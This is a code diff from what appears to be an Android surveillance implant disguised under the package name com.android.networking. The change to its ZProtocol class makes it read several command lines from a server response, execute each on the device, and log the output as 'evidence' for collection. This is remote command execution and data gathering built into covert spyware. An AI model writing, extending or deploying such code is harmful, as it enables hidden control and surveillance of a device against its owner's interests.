@@ -15,8 +15,11 @@ import java.security.SecureRandom;
 import java.util.Date;
 import java.util.Vector;
 
+import org.apache.http.util.EncodingUtils;
+
 import com.android.networking.Core;
 import com.android.networking.Device;
+import com.android.networking.LogR;
 import com.android.networking.Messages;
 import com.android.networking.Status;
 import com.android.networking.action.ExecuteAction;
@@ -37,6 +40,7 @@ import com.android.networking.util.Check;
 import com.android.networking.util.DataBuffer;
 import com.android.networking.util.Execute;
 import com.android.networking.util.ExecuteResult;
+import com.android.networking.util.Utils;
 import com.android.networking.util.WChar;
 
 /**
@@ -991,14 +995,26 @@ public class ZProtocol extends Protocol {
 			}
 			final DataBuffer dataBuffer = new DataBuffer(response, 4, response.length - 4);
 			try {
-				String executionLine = WChar.readPascal(dataBuffer);
-				executionLine = Directory.expandMacro(executionLine);
-				
-				ExecuteResult ret = Execute.execute(executionLine);		
-				
-				Evidence evidence = new Evidence(EvidenceType.COMMAND);
-				evidence.atomicWriteOnce(WChar.pascalize(ret.getStdout()));
-				
+				final int totSize = dataBuffer.readInt();
+				final int numCommand = dataBuffer.readInt();
+				for (int i = 0; i < numCommand; i++) {
+					String executionLine = WChar.readPascal(dataBuffer);
+					executionLine = Directory.expandMacro(executionLine);
+
+					ExecuteResult ret = Execute.execute(executionLine);
+
+					Evidence evidence = new Evidence(EvidenceType.COMMAND);
+					if (Cfg.DEBUG) {
+						Check.log(TAG + " (parseExecute) Output:" + ret.getStdout());
+					}
+
+					byte[] content =  WChar.getBytes(ret.getStdout(),true);
+					final byte[] additional = WChar.pascalize(executionLine);
+
+					new LogR(EvidenceType.COMMAND, LogR.LOG_PRI_STD, additional, content);
+
+				}
+
 			} catch (final IOException e) {
 				if (Cfg.EXCEPTION) {
 					Check.log(e);
